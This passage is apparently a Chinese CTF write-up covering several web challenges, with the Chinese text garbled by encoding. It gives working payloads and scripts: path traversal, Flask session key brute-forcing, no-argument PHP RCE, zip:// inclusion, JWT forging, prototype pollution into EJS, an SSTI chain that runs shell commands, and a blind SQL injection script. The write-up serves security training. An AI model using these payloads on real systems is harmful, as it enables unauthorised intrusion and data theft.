str(uuid.uuid4())\rdef index():\rreturn render_template(\u0026#39;index.html\u0026#39;, articles, **(\u0026#39;articles\u0026#39;,))\rindex = app.route(\u0026#39;/\u0026#39;)(index)\rdef upload():\rif request.method == \u0026#39;POST\u0026#39;:\rtitle = request.form[\u0026#39;title\u0026#39;]\rcontent = request.form[\u0026#39;content\u0026#39;]\rarticle_id = generate_article_id()\rarticle = Article(article_id, title, content)\rarticles.append(article)\rsave_article(article_id, title, content)\rreturn redirect(\u0026#39;/\u0026#39;)\rreturn None(\u0026#39;upload.html\u0026#39;)\rupload = app.route(\u0026#39;/upload\u0026#39;, [\r\u0026#39;GET\u0026#39;,\r\u0026#39;POST\u0026#39;], **(\u0026#39;methods\u0026#39;,))(upload)\rdef article(article_id):\rpass\r# WARNING: Decompyle incomplete\rarticle = app.route(\u0026#39;/article/\u0026lt;article_id\u0026gt;\u0026#39;)(article)\rdef save_article(article_id, title, content):\rsanitized_title = sanitize_filename(title)\rarticle_path = ARTICLES_FOLDER + \u0026#39;/\u0026#39; + sanitized_title\r# WARNING: Decompyle incomplete\rdef sanitize_filename(filename):\rsensitive_chars = [\r\u0026#39;:\u0026#39;,\r\u0026#39;*\u0026#39;,\r\u0026#39;?\u0026#39;,\r\u0026#39;\u0026#34;\u0026#39;,\r\u0026#39;\u0026lt;\u0026#39;,\r\u0026#39;\u0026gt;\u0026#39;,\r\u0026#39;|\u0026#39;,\r\u0026#39;.\u0026#39;]\rfor char in sensitive_chars:\rfilename = filename.replace(char, \u0026#39;_\u0026#39;)\rreturn filename\rif __name__ == \u0026#39;__main__\u0026#39;:\rapp.run(True, **(\u0026#39;debug\u0026#39;,)) flaskæ¨¡æ¿æ­å»ºçš„ï¼Œå…¶ä»–æ²¡å•¥å¥½è¯´çš„ï¼Œå…³é”®ç‚¹å°±åœ¨äºarticle_pathæ‹¼æ¥çš„éƒ¨åˆ†ï¼Œå¹¶æ²¡æœ‰è¿‡æ»¤æ‰/æ–œæ ï¼Œå¯ä»¥åœ¨è¯»å–çš„æ—¶å€™è¿›è¡Œç›®å½•ç©¿è¶Šï¼Œåªéœ€è¦æŠŠæ–‡ç« çš„titleè®¾ç½®ä¸º/f14444ï¼Œç„¶åå†ç‚¹å¼€å°±è¡Œäº†\nå“ˆå“ˆï¼Œè¿™é“é¢˜è¢«æˆ‘æ‹¿äº†ä¸€è¡€ï¼Œé«˜å…´ä¸€ä¸‹O(âˆ©_âˆ©)O\nyou konw flask? #\rä¸¤ä¸ªè·¯ç”±ï¼Œæ³¨å†Œå’Œç™»å½•ï¼Œæ³¨å†Œçš„æ—¶å€™æ˜¾ç¤ºadminå·²è¢«æ³¨å†Œï¼Œå¾ˆæ˜æ˜¾æ˜¯è¦ä¼ªé€ adminèº«ä»½è¿›å»\næ¥ä¸‹æ¥å°±æ˜¯è¦æ‰¾åˆ°secretkeyå€¼ï¼Œè¿›å…¥robots.txtå‘ç°ä¸€ä¸ªæ–°çš„é¡µé¢\nåªéœ€è¦å†™ä¸ªè„šæœ¬çˆ†ç ´ä¸€ä¸‹å°±è¡Œäº†\n#!/usr/bin/env python3\r\u0026#34;\u0026#34;\u0026#34; Flask Session Cookie Decoder \u0026#34;\u0026#34;\u0026#34;\r__author__ = \u0026#39;Wilson Sumanang, Alexandre ZANNI\u0026#39;\rimport zlib\rfrom itsdangerous import base64_decode\rimport ast\rimport os\rfrom flask.sessions import SecureCookieSessionInterface\rimport hashlib\rimport base64\rimport random\rclass MockApp(object):\rdef __init__(self, secret_key):\rself.secret_key = secret_key\rclass FSCM:\r@staticmethod\rdef decode(session_cookie_value, secret_key=None):\rtry:\rif secret_key is None:\rcompressed = False\rpayload = session_cookie_value\rif payload.startswith(\u0026#39;.\u0026#39;):\rcompressed = True\rpayload = payload[1:]\rdata = payload.split(\u0026#34;.\u0026#34;)[0]\rdata = base64_decode(data)\rif compressed:\rdata = zlib.decompress(data)\rreturn data\relse:\rapp = MockApp(secret_key)\rsi = SecureCookieSessionInterface()\rs = si.get_signing_serializer(app)\rreturn s.loads(session_cookie_value)\rexcept Exception as e:\rreturn \u0026#34;[Decoding error] {}\u0026#34;.format(e)\rif __name__ == \u0026#34;__main__\u0026#34;:\rcnt = 1\rwhile True:\rcookie_value = \u0026#39;eyJpc19hZG1pbiI6ZmFsc2UsIm5hbWUiOiIxMjMiLCJ1c2VyX2lkIjoyfQ.ZUO2Eg.dxE1Jqo7vrBWygtgbQ8RndUZHJQ\u0026#39;\rsecret_key = \u0026#39;wanbao\u0026#39;+base64.b64encode(str(random.randint(1, 100)).encode(\u0026#39;utf-8\u0026#39;)).decode(\u0026#39;utf-8\u0026#39;)+\u0026#39;wanbao\u0026#39;\rif secret_key:\rresult = FSCM.decode(cookie_value, secret_key)\relse:\rresult = FSCM.decode(cookie_value)\rcnt += 1\rprint(result, cnt)\rif \u0026#39;[Decoding error]\u0026#39; not in result:\rprint(result, secret_key, \u0026#39;YES\u0026#39;)\rbreak æ‰¾åˆ°äº†keyï¼ŒåŠ å¯†æ¢ä¸Šè¿›å»\nåœ¨å­¦å‘˜ç®¡ç†ç•Œé¢æ‹¿åˆ°flag\nPupyy_rce #\ræ‚„æ‚„è¯ï¼šè¿™é“é¢˜æ˜¯ç¬¬ä¸€å‘¨æ”¾å‡ºæ¥äº†å¤§æ¦‚åŠå°æ—¶åˆä¸‹çº¿äº†ï¼Œåé¢æ‰æ”¾å‡ºæ¥ï¼Œå½“æ—¶æˆ‘payloadéƒ½å†™å¥½äº†ï¼Œå¯æƒœ\næºç å¦‚ä¸‹ğŸ‘‡\n\u0026lt;?php\rhighlight_file(__FILE__);\rheader(\u0026#39;Content-Type: text/html; charset=utf-8\u0026#39;);\rerror_reporting(0);\rinclude(flag.php);\r//å½“å‰ç›®å½•ä¸‹æœ‰å¥½åº·çš„ğŸ˜‹\rif (isset($_GET[\u0026#39;var\u0026#39;]) \u0026amp;\u0026amp; $_GET[\u0026#39;var\u0026#39;]) {\r$var = $_GET[\u0026#39;var\u0026#39;];\rif (!preg_match(\u0026#34;/env|var|session|header/i\u0026#34;, $var,$match)) {\rif (\u0026#39;;\u0026#39; === preg_replace(\u0026#39;/[^\\s\\(\\)]+?\\((?R)?\\)/\u0026#39;, \u0026#39;\u0026#39;, $var)){\reval($_GET[\u0026#39;var\u0026#39;]);\r}\relse die(\u0026#34;WAF!!\u0026#34;);\r} else{\rdie(\u0026#34;PLZ DONT HCAK MEğŸ˜…\u0026#34;);\r}\r} è¿™ä¸ªæ­£åˆ™åŒ¹é…æ˜¯ç»å…¸çš„æ— å‚æ•°RCEæ¨¡å¼\nä½¿ç”¨phpçš„å†…ç½®å‡½æ•°è¯»å–æ–‡ä»¶å³å¯\nå½“å‰ç›®å½•å­˜åœ¨flag.php\npayloadğŸ‘‡\n?var=show_source(array_rand(array_flip(scandir(current(localeconv()))))); è¿™é‡Œé‡‡ç”¨çš„æ–¹æ³•æ˜¯éšæœºè¯»å–å½“å‰ç›®å½•çš„æ–‡ä»¶ï¼Œä¸€ç›´åˆ·æ–°å°±èƒ½è¯»å–åˆ°flag\nfamale_imp_l0v #\rä¸¤ä¸ªphpï¼Œä¸€ä¸ªç”¨æ¥ä¸Šä¼ zipæ–‡ä»¶ï¼Œå¦ä¸€ä¸ªç”¨æ¥åŒ…å«æ–‡ä»¶\n\u0026lt;?php\r//o2takuXXå¸ˆå‚…è¯´æœ‰é—®é¢˜ï¼Œå¿˜çœ‹äº†ã€‚\rheader(\u0026#39;Content-Type: text/html; charset=utf-8\u0026#39;);\rhighlight_file(__FILE__);\r$file = $_GET[\u0026#39;file\u0026#39;];\rif(isset($file) \u0026amp;\u0026amp; strtolower(substr($file, -4)) == \u0026#34;.jpg\u0026#34;){\rinclude($file);\r}\r?\u0026gt; ä¸éš¾æƒ³åˆ°phpä¼ªåè®®ä¸­çš„zip://ä¼ªåè®®\nè¦å…ˆæŠŠphpæ–‡ä»¶è¿›è¡Œæ‰“åŒ…è¿›zipï¼Œç„¶åä¸Šä¼ zipï¼Œå†åˆ°include.phpè¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Œè¦æ³¨æ„ä½¿ç”¨zipä¼ªåè®®çš„æ—¶å€™å¦‚æœæƒ³è¦è¿›ä¸€æ­¥è¾¾åˆ°zipé‡Œçš„æ–‡ä»¶ï¼Œéœ€è¦ä½¿ç”¨ # äº•å·è¿æ¥ï¼Œå¹¶ä¸”è¦urlencode\nè´´ä¸€ä¸ªæ–‡ç« ï¼šã€æ–‡ä»¶ä¸Šä¼ ã€‘zipä¼ªåè®®ä¸Šä¼ è§£æ_zip:///-CSDNåšå®¢\né›¨ #\rVanZYç»™ç™½æœˆå…‰å†™äº†ä¸€å¼ æ˜ä¿¡ç‰‡ï¼Œå¿«å»å¸®ä»–æŠŠidç­¾ä¸Šå§\nåœ¨hintè·¯ç”±ä¸‹ç»™å‡ºäº†secret_keyçš„ä¿¡æ¯\nåŒæ—¶åœ¨httpå¤´é‡Œå‘ç°cookie\nä¸è¿‡è¿™é“é¢˜ä¸æ˜¯flask sessionï¼Œè€Œæ˜¯jwt tokenï¼Œä¸¤è€…çš„åŒºåˆ«å¯ä»¥è‡ªè¡Œæœç´¢\nä¸¤è€…çš„åŠ å¯†æ–¹å¼ä¸åŒï¼Œå†™çš„è„šæœ¬ä¹Ÿä¸åŒ\nimport jwt\r# ç¤ºä¾‹ç”¨æ³•\rpayload = {\u0026#39;user\u0026#39;: \u0026#39;admin\u0026#39;, \u0026#39;iat\u0026#39;: 1698977214}\rsecret_key = \u0026#39;VanZY\u0026#39;\rencoded_token = jwt.encode(payload, secret_key, algorithm=\u0026#39;HS256\u0026#39;)\rprint(encoded_token.encode())\r#eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE2OTg5NzcyMTR9.QsHyTGY5GnM7WWzf69WbkVOj8UySuBpIsTQfR8Jr2q0 ä¸‹é¢æ˜¯sourceæºç ğŸ‘‡\nconst express = require(\u0026#39;express\u0026#39;);\rconst jwt = require(\u0026#39;jsonwebtoken\u0026#39;);\rconst app = express();\rconst bodyParser = require(\u0026#39;body-parser\u0026#39;)\rconst path = require(\u0026#39;path\u0026#39;);\rconst jwt_secret = \u0026#34;VanZY\u0026#34;;\rconst cookieParser = require(\u0026#39;cookie-parser\u0026#39;);\rconst putil_merge = require(\u0026#34;putil-merge\u0026#34;)\rapp.set(\u0026#39;views\u0026#39;, \u0026#39;./views\u0026#39;);\rapp.set(\u0026#39;view engine\u0026#39;, \u0026#39;ejs\u0026#39;);\rapp.use(cookieParser());\rapp.use(bodyParser.urlencoded({extended: true})).use(bodyParser.json())\rvar Super = {};\rvar safecode = function (code){\rlet validInput = /global|mainModule|import|constructor|read|write|_load|exec|spawnSync|stdout|eval|stdout|Function|setInterval|setTimeout|var|\\+|\\*/ig;\rreturn !validInput.test(code);\r};\rapp.all(\u0026#39;/code\u0026#39;, (req, res) =\u0026gt; {\rres.type(\u0026#39;html\u0026#39;);\rif (req.method == \u0026#34;POST\u0026#34; \u0026amp;\u0026amp; req.body) {\rputil_merge({}, req.body, {deep:true});\r}\rres.send(\u0026#34;welcome to code\u0026#34;);\r});\rapp.all(\u0026#39;/hint\u0026#39;, (req, res) =\u0026gt; {\rres.type(\u0026#39;html\u0026#39;);\rres.send(\u0026#34;I heard that the challenge maker likes to use his own id as secret_key\u0026#34;);\r});\rapp.get(\u0026#39;/source\u0026#39;, (req, res) =\u0026gt; {\rres.type(\u0026#39;html\u0026#39;);\rvar auth = req.cookies.auth;\rjwt.verify(auth, jwt_secret , function(err, decoded) {\rtry{\rif(decoded.user===\u0026#39;admin\u0026#39;){\rres.sendFile(path.join(__dirname + \u0026#39;/index.js\u0026#39;));\r}else{\rres.send(\u0026#39;you are not admin \u0026lt;!--Maybe you can view /hint--\u0026gt;\u0026#39;);\r}\r}\rcatch{\rres.send(\u0026#34;Fuck you Hacker!!!\u0026#34;)\r}\r});\r});\rapp.all(\u0026#39;/create\u0026#39;, (req, res) =\u0026gt; {\rres.type(\u0026#39;html\u0026#39;);\rif (!req.body.name || req.body.name === undefined || req.body.name === null){\rres.send(\u0026#34;please input name\u0026#34;);\r}else {\rif (Super[\u0026#39;userrole\u0026#39;] === \u0026#39;Superadmin\u0026#39;) {\rres.render(\u0026#39;index\u0026#39;, req.body);\r}else {\rif (!safecode(req.body.name)) {\rres.send(\u0026#34;ä½ åœ¨åšä»€ä¹ˆï¼Ÿå¿«åœä¸‹ï¼ï¼ï¼\u0026#34;)\r}\relse{\rres.render(\u0026#39;index\u0026#39;, {name: req.body.name});\r}\r}\r}\r});\rapp.get(\u0026#39;/\u0026#39;,(req, res) =\u0026gt; {\rres.type(\u0026#39;html\u0026#39;);\rvar token = jwt.sign({\u0026#39;user\u0026#39;:\u0026#39;guest\u0026#39;},jwt_secret,{ algorithm: \u0026#39;HS256\u0026#39; });\rres.cookie(\u0026#39;auth \u0026#39;,token);\rres.end(\u0026#39;Only admin can get source in /source\u0026#39;);\r});\rapp.listen(3000, () =\u0026gt; console.log(\u0026#39;Server started on port 3000\u0026#39;)); åœ¨createè·¯ç”±ä¸‹å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªSuperadminçš„éªŒè¯ï¼Œåœ¨codeè·¯ç”±ä¸‹æœ‰ä¸€ä¸ªPOSTä¼ å…¥å¹¶ä¸”mergeåˆå¹¶çš„è¿‡ç¨‹\nä¸éš¾è”æƒ³åˆ°åŸå‹é“¾æ±¡æŸ“çš„ç›¸å…³çŸ¥è¯†ï¼Œç”±äºSuperæœ¬èº«æ˜¯ç©ºçš„ï¼Œæˆ‘ä»¬éœ€è¦åœ¨codeé¡µé¢ä¸‹POSTä¸€ä¸ªJSONåŒ…æ±¡æŸ“objectçš„åŸå‹ï¼Œä»è€Œä½¿æ‰€æœ‰å¯¹è±¡éƒ½å¸¦æœ‰userroleå±æ€§ä¸”å€¼ä¸ºSuperadmin\nè¿™é‡Œæˆ‘ç”¨__proto__ä¸çŸ¥é“æ€ä¹ˆä¸è¡Œï¼Œåªèƒ½ä½¿ç”¨constructoræ¥å®ç°ï¼Œè¿™ä¸ªåœ¨0xgameæ¯”èµ›é‡Œæœ‰ç”¨åˆ°è¿‡\nåœ¨è¿™é‡Œè´´ä¸¤ä¸ªæ–‡ç« \nç†è§£åŸå‹é“¾æ±¡æŸ“ - depy (rce.ink)\nNode.jsåŸå‹é“¾æ±¡æŸ“çš„åˆ©ç”¨ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·\næ±¡æŸ“ä¹‹åå†è¿›å…¥createè·¯ç”±ä¸‹ï¼Œnameå‚æ•°å°±æ²¡æœ‰ä»»ä½•é™åˆ¶äº†\nç»è¿‡åæ¥å­¦ä¹ ï¼Œè¿™é“é¢˜å’Œnameæ²¡ä»€ä¹ˆå…³ç³»ï¼Œä¸»è¦è¿˜æ˜¯ejsè¿™ä¸ªæ¨¡æ¿çš„renderæ¸²æŸ“é—®é¢˜\nè¿™ä¸ªæ¨¡æ¿æ˜¯å­˜åœ¨CVEæ¼æ´çš„ï¼Œç½‘ä¸Šå¯ä»¥æœä¸€ä¸‹\nè¿™é“é¢˜å’ŒHGAME2023ä¸­WEEK4çš„Shared Dairyæ¯”è¾ƒç›¸ä¼¼ï¼Œå¯ä»¥æ‰¾å®˜æ–¹WPçœ‹çœ‹ï¼Œè¿™é‡Œä¸å†èµ˜è¿°\nç”±äºè¿™ä¸ªejsçš„ç‰ˆæœ¬æ¯”è¾ƒé«˜ï¼ŒåŸæœ¬çš„outputFunctionNameåœ¨è¿™é‡Œå°±æˆä¸ºäº†éæ³•å­—ç¬¦ï¼Œå¥½åœ¨å®˜æ–¹ä¿®å¤çš„æ—¶å€™å¥½åƒæ¼æ‰äº†ä¸€ä¸ªescapeFunctionï¼Œåˆšå¥½å¯ä»¥åˆ©ç”¨\nç›´æ¥è¯´åšé¢˜æ­¥éª¤ï¼Œç°åœ¨codeé¡µé¢è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“ï¼Œæ³¨æ„ç®­å¤´æŒ‡çš„åœ°æ–¹\nç„¶ååªä¿®æ”¹ç¬¬ä¸€è¡Œçš„codeä¸ºcreateï¼Œå…¶ä»–çš„åˆ«åŠ¨ï¼Œä¹Ÿåˆ«å¦å¤–å¼€ä¸€ä¸ªrepeaterï¼Œå°±åœ¨è¿™ä¸€ä¸ªæ“ä½œ\nå¾—åˆ°flagçš„åå­—ï¼Œç„¶åå†å›åˆ°codeé¡µé¢ä¿®æ”¹å‘½ä»¤æ‰§è¡Œï¼Œæœ€åè·³å›createç•Œé¢å³å¯\né’ˆå¯¹äºè¿™ä¸ªejsæ¨¡æ¿ï¼Œæˆ‘å†è´´å‡ ä¸ªæ–‡ç« ï¼š\nhttps://inhann.top/2023/03/26/ejs/\nhttps://thnpkm.xyz/index.php/archives/111/\nhttps://www.ctfiot.com/120877.html\nklf_2 #\rå‘ç°ä¸€ä¸ªsecret\nå‚æ•°è¿˜æ˜¯klfï¼Œè¿™æ¬¡ç”¨è„šæœ¬è·‘ä¸å‡ºæ¥äº†ï¼Œå¾—ç”¨æ‰‹æ³¨\nè¿™æ¬¡è¿‡æ»¤çš„å¾ˆä¸¥æ ¼ï¼Œæ¯”å¦‚å¸¸è§çš„å…³é”®å­—ï¼šclassï¼Œglobalï¼Œgetitemç­‰ç­‰\nä»¥åŠä¸€äº›ç‰¹æ®Šç¬¦å·ï¼šå•åŒå¼•å·ã€ä¸­æ‹¬å·ã€åŠ å‡ä¹˜é™¤ã€æ–œæ ç­‰ç­‰\nä¸è¿‡å¥½åœ¨å¯ä»¥é€šè¿‡setæ–¹æ³•æ¥å¤„ç†å­—ç¬¦ä¸²\næˆ‘è¿™é‡Œå°±ç›´æ¥ä¸Špayloadæ¥å¯¹ç€è¯´å§\nhttp://qkxc2u105bpv62hkormtdb5oc.node.game.sycsec.com/secr3ttt?klf=\r{%set b=dict(po=1,p=2)|join%}#ç”¨äºæå–å­—ç¬¦ä¸²ä¸­çš„æŸä¸ªå­—ç¬¦ï¼Œç”¨æ³•pop(5)\r{%set line=(lipsum|string|list)|attr(b)(18) %} #é€šè¿‡lipsumæ¥è·å–å•ä¸ªä¸‹åˆ’çº¿\r{%set towline=(line,line)|join %} #ä¸‹åˆ’çº¿ç»„åˆæˆä¸¤ä¸ªä¸‹åˆ’çº¿\r{%set glbs=((towline,dict(glo=1,bals=2)|join)|join,towline)|join%}#dictåˆæˆ__globals__å…³é”®å­—\r{%set gtitem=(towline,dict(ge=1,titem=2)|join,towline)|join%} #dictåˆæˆ__getitem__å…³é”®å­—\r{%set pp=dict(po=a,pen=2)|join%} #dictåˆæˆpopenå…³é”®å­—\r{%set oo=dict(o=a,s=b)|join%} #os\r{%set rd=dict(re=1,ad=2)|join%} #read {%set kg=lipsum|string|list|attr(b)(9)%} #è·å–ç©ºæ ¼\r{%set bult=(towline,dict(bui=1,ltins=2)|join,towline)|join%} #è·å–__builtins__\r{%set ch=dict(ch=1,r=2)|join%} #è·å–chrå­—ç¬¦ä¸²ï¼Œå› ä¸ºç‰¹æ®Šç¬¦å·æ–œæ è¢«è¿‡æ»¤äº†ï¼Œè¿™é‡Œåªèƒ½ä½¿ç”¨chræ¥åˆ›å»º {%set gt=dict(get=a)|join%} #get\r{%set cha=(lipsum|attr(glbs))|attr(gt)(bult)|attr(gt)(ch)%} #åˆ›å»ºchrå‡½æ•°\r{%set rd=dict(re=1,ad=2)|join%} #read ï¼Ÿä¸Šé¢å¥½åƒå†™è¿‡äº† ã€‚ã€‚ã€‚ã€‚ã€‚æˆ‘çš„\r{%set sv=lipsum|string|list|attr(b)(36)%} #è·å–æ•°å­—7ï¼Œå› ä¸ºæ–œæ \\çš„asciiæ˜¯47ï¼Œè¿™é‡Œ7æ˜¯ä¼šè¢«æ£€æµ‹\r{%set f=4%} #è·å–4\r{%set ap=dict(ap=1,p=2)|join%} #æˆ‘åœ¨å½“å‰ç›®å½•æ²¡æœ‰æ‰¾åˆ°flagï¼ŒçœŸçš„flagåœ¨/appè·¯ç”±ä¸‹\r{%set n=(f,sv)|join|int%} #ç»„æˆ47çš„æ•°å­—ï¼Œè¿™ä¸ªintæœ‰å¿…è¦\r{%set fl=dict(f=1,l=2)|join%} {%set gg=(f,dict(g=1)|join)|join%} #flagçš„åå­—å« fl4gfl4gfl4g\r{%set fg=(fl,gg,fl,gg,fl,gg)|join%} #è¿™è¿ç€çš„ä¸‰ä¸ªåº”è¯¥å¯ä»¥ä¼˜åŒ–ï¼Œæˆ‘å†™çš„æœ‰ç‚¹è‡ƒè‚¿\r{%set shell=((dict(ca=1,t=2)|join,kg,cha(n))|join,ap,cha(n),fg)|join%}#cat /app/fl4gfl4gfl4g\r{{lipsum|attr(glbs)|attr(gtitem)(oo)|attr(pp)(shell)|attr(rd)()}} #æ‰§è¡Œå®Œ ç›¸å…³é“¾æ¥ğŸ‘‡\nFlask-jinja2 SSTI ä¸€èˆ¬åˆ©ç”¨å§¿åŠ¿ â€“ AndyNoel\u0026rsquo;s Blog\nCTFSHOW SSTI web369-web372 æ‹¼æ¥ç»•è¿‡_ssti 369-CSDNåšå®¢\nå…³äºSSTIæ³¨å…¥çš„äºŒä¸‰äº‹ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)\næœ‰è¶£çš„äº‹æƒ…ï¼šå»SYCé¢è¯•çš„æ—¶å€™ï¼Œå¥½åƒé—®åˆ°SSTIéƒ¨åˆ†ï¼ŒDeltyï¼ˆæˆ‘è§‰å¾—åº”è¯¥æ˜¯ä»–ï¼‰é—®æˆ‘å½“æ–œæ è¢«è¿‡æ»¤æ‰çš„æ—¶å€™æ€ä¹ˆåŠï¼Ÿå½“æ—¶æ‘†å¤´ä¸çŸ¥é“ï¼Œä»–å°±è¯´ç”¨builtinsè¿™ä¸ªå…³é”®å­—å¼•å…¥chrå‡½æ•°ã€‚åšè¿™é“é¢˜çš„æ—¶å€™å°±æƒ³èµ·æ¥è¿™ä»¶äº‹\nez_sql #\rä¸€é“å¸ƒå°”ç›²æ³¨çš„é¢˜ç›®\né¢˜ç›®ç»™äº†ä¸€ä¸ªIDè¾“å…¥æ¡†ï¼Œæµ‹è¯•è¿‡åæ˜¯å­—ç¬¦å‹å•å¼•å·é—­åˆ\nè€Œä¸”é¡µé¢æœ‰ä¸‰ç§å›æ˜¾çŠ¶æ€\nç¬¬ä¸€ç§å°±æ˜¯ä¸Šå›¾çš„å›æ˜¾æŸ¥è¯¢ID\nç¬¬äºŒç§æ˜¯è¾“å…¥äº†éæ³•å­—ç¬¦ä¼šå›æ˜¾ï¼šwafï¼ï¼ï¼\nç¬¬ä¸‰ç§å¯¹åº”çš„æ˜¯æŸ¥è¯¢å¤±è´¥ï¼Œæˆ–è€…è¯´sqlè¯­å¥æœ‰é—®é¢˜ï¼Œæ‰§è¡Œå‡ºé”™ï¼Œä½†æ²¡æœ‰æŠ¥é”™ä¿¡æ¯ï¼Œåªä¼šå›æ˜¾ï¼šåˆ«ç¿»å•¦ï¼è¿™ä¹ˆå¤šå¿ƒçµé¸¡æ±¤éƒ½duä¸äº†ä½ å—\nä¸Šburpçœ‹çœ‹è¿‡æ»¤äº†å“ªäº›ğŸ‘‡ï¼Œåœ¨intruderé‡Œæ ‡è®°å‚æ•°ï¼Œå­—å…¸ç”¨çš„ç½‘ä¸Šéšä¾¿æ‰¾çš„\nä¸€äº›å¸¸ç”¨çš„æ¯”å¦‚ï¼šorã€sleepã€idã€substrã€midã€leftã€rightã€ä¸‰ä¸ªæŠ¥é”™å‡½æ•°ã€databaseã€benchmarkã€countã€concatã€information_schemaä»¥åŠç©ºæ ¼ç­‰ç­‰\nèƒ½ç”¨çš„æœ‰ï¼šï¼ˆã€ï¼‰ã€selectã€whereã€likeã€regexpã€unionã€lengthã€limitã€fromç­‰ç­‰\nä¸éš¾æƒ³åˆ°è¿™æ˜¯é€šè¿‡likeæ¨¡ç³ŠæŸ¥è¯¢çš„å¸ƒå°”ç›²æ³¨é¢˜ç›®\né¦–å…ˆï¼Œdatabaseè¢«banäº†ï¼Œå¦‚ä½•æŸ¥è¯¢æ•°æ®åº“å‘¢ï¼Ÿï¼ˆè¿™é“é¢˜çš„flagä¸åœ¨å½“å‰æ•°æ®åº“\nç”¨likeæ¨¡ç³ŠæŸ¥è¯¢å¾—çŸ¥å½“å‰mysqlç‰ˆæœ¬æ˜¯5.7å‡ ï¼Œè€Œåœ¨5.7ä¹‹åmysqlé»˜è®¤å­˜åœ¨ä¸€ä¸ªsys.schema_table_statistics_with_bufferåº“ï¼Œé‡Œé¢å­˜æ”¾äº†æ‰€æœ‰åº“çš„åç§°ï¼Œé‡Œé¢çš„å­—æ®µåæœ‰table_schemaå’Œtable_nameï¼Œç”¨äºå­˜æ”¾è¡¨ä»¥åŠå¯¹åº”çš„æ•°æ®åº“\né‚£å°±å…ˆæ¥è·‘ä¸€ä¸‹æ•°æ®åº“å’Œè¡¨å\nå¦‚æœä¸åŠ ä¸Štableåç§°çš„é™åˆ¶çš„è¯ï¼Œè·‘å‡ºæ¥çš„å½“å‰æ•°æ®åº“å°±æ˜¯articlesï¼Œé‡Œé¢æ˜¯æ²¡æœ‰flagçš„ï¼Œè¿™é‡Œå°±ä¸å†æˆªå›¾\nåˆ°è¿™ä¸€æ­¥çš„è¯ï¼Œsysè¿™ä¸ªè¡¨å°±æ²¡ä»€ä¹ˆç”¨å¤„äº†ï¼Œå› ä¸ºé‡Œé¢æ²¡æœ‰å­—æ®µçš„åç§°\næ¥ä¸‹æ¥å°±æ˜¯è¦ä½¿ç”¨æ— åˆ—åå¸ƒå°”ç›²æ³¨ï¼Œjoinåœ¨è¿™é‡Œä¹Ÿæ˜¯è¢«banäº†çš„ï¼Œä¸è¿‡ä¹Ÿæœ‰å…¶ä»–çš„æ–¹å¼\nè¿™é‡Œæ”¾å‡ ä¸ªæ–‡ç« ï¼Œæˆ‘ä¹Ÿä¸å†èµ˜è¿°äº†ï¼ˆæ‡’çš„æ‰“å­—ã€‚ã€‚ï¼‰ï¼š\nMysqlæ— åˆ—åæ³¨å…¥/PDO/å˜é‡æ³¨å…¥ | (guokeya.github.io)\næ— åˆ—åæ³¨å…¥ç»•è¿‡information_schema â€“ JohnFrod\u0026rsquo;s Blog\nMySQL LIKEï¼šæ¨¡ç³ŠæŸ¥è¯¢ - å®‰æš–å¦‚åˆ - åšå®¢å›­ (cnblogs.com)\né¦–å…ˆè¦ç¡®å®šflagè¡¨æœ‰å‡ åˆ—ï¼Œè¿™ä¸ªç”¨æ— åˆ—ååŠ ä¸Šgroup byçœ‹å›æ˜¾å°±èƒ½çŸ¥é“flagåªæœ‰ä¸€åˆ—\nç„¶åæˆ‘åœ¨æœ¬åœ°æµ‹è¯•çš„è¯ï¼Œèƒ½é€šè¿‡çš„æ˜¯ä¸‹é¢è¿™ç§å½¢å¼çš„\nselect \u0026#39;0\u0026#39; ||\r(select/**/hex(e.c)/**/from (select/**/c/**/from/**/(select/**/2/**/c/**/union/**/select/**/*/**/from/**/ctf.flll444aaggg9)x/**/limit/**/1,1)e/**/where/**/length(hex(e.c))\u0026gt;1/**/and/**/e.c/**/like/**/\u0026#39;%\u0026#39;)\r||\u0026#39;0\u0026#39;; æ ¹æ®è¿™ä¸ªï¼Œé’ˆå¯¹likeçš„éƒ¨åˆ†å†™è„šæœ¬\nimport requests\rimport string\rdic=\u0026#34;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$\u0026amp;\u0026#39;()*+,-./:;\u0026lt;=\u0026gt;?@[\\]^`{|}~_\u0026#34;\rurl=\u0026#39;http://47.108.56.168:1113/\u0026#39;\rpayload={\u0026#34;id\u0026#34;:\u0026#34;0\u0026#39;||(select/**/hex(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/length(hex(table_name))\u0026gt;1/**/and/**/hex(table_name)/**/like/**/\u0026#39;%\u0026#39;/**/limit/**/0,1)||\u0026#39;0\u0026#34;}\rpart1=\u0026#34;0\u0026#39;||(select/**/hex(e.c)/**//**/from/**/(select/**/c/**/from/**/(select/**/2/**/c/**/union/**/select/**/*/**/from/**/ctf.flll444aaggg9)x/**/limit/**/2,1)e/**//**/where/**/length(hex(e.c))\u0026gt;1/**/and/**//**/e.c/**/like/**/binary/**/\u0026#39;\u0026#34;\r#part1=\u0026#34;0\u0026#39;||(select/**/hex(table_name)/**/from/**/sys.schema_table_statistics_with_buffer/**/where/**/table_schema/**/like/**/\u0026#39;ctf\u0026#39;/**/and/**/hex(table_name)/**/like/**/\u0026#39;\u0026#34;\rpart2=\u0026#34;%\u0026#39;/**//**/)||\u0026#39;0\u0026#34;\rmidpart=\u0026#39;\u0026#39;\rwhile True:\rcheck=0\rfor i in dic:\rpayload={\u0026#34;id\u0026#34;:part1+midpart+i+part2}\rprint(payload)\rr=requests.post(url,payload).text\rif \u0026#39;åˆ«ç¿»å•¦\u0026#39; not in r and \u0026#39;waf\u0026#39; not in r and \u0026#39;ä½ æè¿™\u0026#39; not in r:\rmidpart+=i\rprint(i)\rcheck=1\rbreak;\rif check==0:\rbreak\rprint(midpart)\rprint(midpart)\r#SYC{73hd72hfds68r42yuf874r79v8sd43u89f} æ³¨æ„å‡ ä¸ªç‚¹ï¼Œdicå­—å…¸é‡Œè¦æŠŠä¸‹åˆ’çº¿æ”¾åˆ°æœ€åä¸€ä¸ªä½ç½®ï¼Œå› 